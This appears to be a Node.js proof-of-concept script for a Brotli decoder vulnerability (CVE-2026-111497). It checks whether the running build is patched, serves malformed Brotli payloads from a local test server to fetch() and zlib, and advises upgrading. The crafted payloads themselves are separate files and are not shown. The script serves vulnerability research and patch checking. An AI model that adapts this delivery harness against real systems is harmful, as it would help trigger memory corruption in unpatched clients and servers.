#!/usr/bin/env node
/**
 * CVE-2026-111497 attack surface demonstration.
 *
 * Shows that:
 * 1. Node.js fetch() automatically decompresses Brotli responses
 * 2. A malicious server can send crafted Brotli payloads to any fetch() client
 * 3. Express 5 / body-parser decodes br request bodies by default
 * 4. The patch detection constant is missing on vulnerable builds
 */

const http = require('http');
const zlib = require('zlib');
const fs = require('fs');
const path = require('path');

const PAYLOAD_DIR = path.join(__dirname, 'payloads');

// ─── 1. Patch detection ───
function checkPatch() {
  console.log('=== Patch Detection ===');
  console.log(`Node.js: ${process.version}`);

  const c = zlib.constants;
  const blockSwitchErr = c.BROTLI_DECODER_ERROR_FORMAT_BLOCK_SWITCH;

  if (blockSwitchErr === undefined) {
    console.log('BROTLI_DECODER_ERROR_FORMAT_BLOCK_SWITCH: MISSING');
    console.log('Status: VULNERABLE (error code -17 not defined)\n');
    return false;
  } else {
    console.log(`BROTLI_DECODER_ERROR_FORMAT_BLOCK_SWITCH: ${blockSwitchErr}`);
    console.log('Status: PATCHED\n');
    return true;
  }
}

// ─── 2. Malicious server serving Content-Encoding: br ───
async function demoFetchAttackSurface() {
  console.log('=== Attack Surface: fetch() auto-decompresses Brotli ===');

  // Read a malformed payload
  const payloadFiles = fs.readdirSync(PAYLOAD_DIR).filter(f => f.includes('nblflip') && f.endsWith('.br'));
  if (payloadFiles.length === 0) {
    console.log('No NBLTYPES-flip payloads found. Run craft_payloads.py first.');
    return;
  }

  const malformedPayload = fs.readFileSync(path.join(PAYLOAD_DIR, payloadFiles[0]));
  // Also prepare a valid Brotli payload for comparison
  const validPayload = zlib.brotliCompressSync(Buffer.from('{"status":"ok","data":"hello"}'));

  const server = http.createServer((req, res) => {
    if (req.url === '/valid') {
      res.writeHead(200, {
        'Content-Type': 'application/json',
        'Content-Encoding': 'br',
      });
      res.end(validPayload);
    } else if (req.url === '/malformed') {
      res.writeHead(200, {
        'Content-Type': 'application/json',
        'Content-Encoding': 'br',
      });
      res.end(malformedPayload);
    } else {
      res.writeHead(200, { 'Content-Type': 'text/plain' });
      res.end('CVE-2026-111497 demo server');
    }
  });

  await new Promise((resolve) => server.listen(0, '127.0.0.1', resolve));
  const port = server.address().port;
  console.log(`Local malicious server on port ${port}`);

  // Test 1: Valid Brotli response — fetch() transparently decompresses
  try {
    console.log('\n[1] fetch() with valid Content-Encoding: br...');
    const resp = await fetch(`http://127.0.0.1:${port}/valid`);
    const text = await resp.text();
    console.log(`    Result: ${text}`);
    console.log('    fetch() transparently decompressed the Brotli response.');
  } catch (err) {
    console.log(`    Error: ${err.message}`);
  }

  // Test 2: Malformed Brotli response — shows that malformed data reaches the decoder
  try {
    console.log('\n[2] fetch() with MALFORMED Content-Encoding: br...');
    const resp = await fetch(`http://127.0.0.1:${port}/malformed`);
    const text = await resp.text();
    console.log(`    !! Decompression succeeded (unexpected): ${text.length} bytes`);
  } catch (err) {
    console.log(`    Error caught: ${err.cause?.code || err.code || err.message?.slice(0, 100)}`);
    console.log('    The malformed Brotli data reached the decoder via fetch().');
    console.log('    In a real exploit, a crafted payload could trigger the OOB write.');
  }

  server.close();
  console.log();
}

// ─── 3. Show that common libraries default to Brotli ───
function demoDefaultBrotliUsage() {
  console.log('=== Default Brotli Usage in Node.js ===');

  // fetch() sends Accept-Encoding: br by default
  console.log('fetch() behavior:');
  console.log('  - Sends Accept-Encoding including "br" by default');
  console.log('  - Automatically decompresses Content-Encoding: br responses');
  console.log('  - No opt-out without custom header override');
  console.log();

  // zlib Brotli is always available
  console.log('zlib module:');
  console.log(`  - brotliCompressSync: ${typeof zlib.brotliCompressSync}`);
  console.log(`  - brotliDecompressSync: ${typeof zlib.brotliDecompressSync}`);
  console.log(`  - BrotliCompress stream: ${typeof zlib.BrotliCompress}`);
  console.log(`  - BrotliDecompress stream: ${typeof zlib.BrotliDecompress}`);
  console.log();
}

// ─── 4. Error code comparison: unpatched vs patched ───
function demoErrorCodeDifference() {
  console.log('=== Error Code Behavior on Malformed Brotli ===');
  console.log('On unpatched builds, the block-switch error is silently ignored.');
  console.log('On patched builds, it returns BROTLI_DECODER_ERROR_FORMAT_BLOCK_SWITCH (-17).');
  console.log();

  // Test a few malformed payloads and show the error codes
  const payloadFiles = fs.readdirSync(PAYLOAD_DIR)
    .filter(f => f.endsWith('.br'))
    .slice(0, 5);

  for (const file of payloadFiles) {
    const data = fs.readFileSync(path.join(PAYLOAD_DIR, file));
    try {
      zlib.brotliDecompressSync(data);
      console.log(`  ${file}: decompressed OK (unexpected)`);
    } catch (err) {
      console.log(`  ${file}: ${err.code} (errno ${err.errno})`);
    }
  }
  console.log();

  // Show what error codes exist
  const brotliErrors = Object.entries(zlib.constants)
    .filter(([k]) => k.startsWith('BROTLI_DECODER_ERROR'))
    .sort(([, a], [, b]) => a - b);

  console.log('Available Brotli decoder error constants:');
  for (const [name, val] of brotliErrors) {
    const marker = name === 'BROTLI_DECODER_ERROR_FORMAT_BLOCK_SWITCH' ? ' ← (patch indicator)' : '';
    console.log(`  ${val}: ${name}${marker}`);
  }

  const has17 = brotliErrors.some(([, v]) => v === -17);
  if (!has17) {
    console.log('  -17: (MISSING — reserved slot, not defined on this build)');
  }
  console.log();
}

// ─── 5. Streaming decompression test ───
async function demoStreamingDecompression() {
  console.log('=== Streaming Brotli Decompression Test ===');
  console.log('Testing if chunk-by-chunk decompression behaves differently...\n');

  const payloadFiles = fs.readdirSync(PAYLOAD_DIR)
    .filter(f => f.includes('nblflip') && f.endsWith('.br'));

  for (const file of payloadFiles.slice(0, 3)) {
    const data = fs.readFileSync(path.join(PAYLOAD_DIR, file));
    const chunkSize = 64;

    const result = await new Promise((resolve) => {
      const decompressor = zlib.createBrotliDecompress();
      const chunks = [];
      let error = null;

      decompressor.on('data', (chunk) => chunks.push(chunk));
      decompressor.on('error', (err) => {
        error = err;
        resolve({ file, status: 'error', code: err.code, errno: err.errno });
      });
      decompressor.on('end', () => {
        if (!error) {
          resolve({ file, status: 'success', size: Buffer.concat(chunks).length });
        }
      });

      // Feed data in small chunks
      let offset = 0;
      const feedNext = () => {
        if (offset >= data.length) {
          decompressor.end();
          return;
        }
        const chunk = data.slice(offset, offset + chunkSize);
        offset += chunkSize;
        if (!decompressor.write(chunk)) {
          decompressor.once('drain', feedNext);
        } else {
          setImmediate(feedNext);
        }
      };
      feedNext();

      // Timeout
      setTimeout(() => resolve({ file, status: 'timeout' }), 5000);
    });

    console.log(`  ${result.file}: ${result.status} (${result.code || result.errno || ''})`);
  }
  console.log();
}

async function main() {
  console.log('╔══════════════════════════════════════════════════╗');
  console.log('║  CVE-2026-111497 Attack Surface Demonstration   ║');
  console.log('╚══════════════════════════════════════════════════╝\n');

  const patched = checkPatch();
  demoDefaultBrotliUsage();
  demoErrorCodeDifference();
  await demoFetchAttackSurface();
  await demoStreamingDecompression();

  console.log('=== Conclusion ===');
  if (!patched) {
    console.log('This Node.js build is VULNERABLE to CVE-2026-111497.');
    console.log('The Brotli decoder is missing the BLOCK_SWITCH error check.');
    console.log('Any code path that decompresses untrusted Brotli data is at risk:');
    console.log('  - fetch() responses from untrusted servers');
    console.log('  - Express 5 / body-parser 2.x request bodies');
    console.log('  - Direct zlib.brotliDecompress* on untrusted input');
    console.log(`\nUpgrade to Node.js >= 24.22.1 (current: ${process.version})`);
  } else {
    console.log('This Node.js build is PATCHED against CVE-2026-111497.');
  }
}

main().catch(console.error);
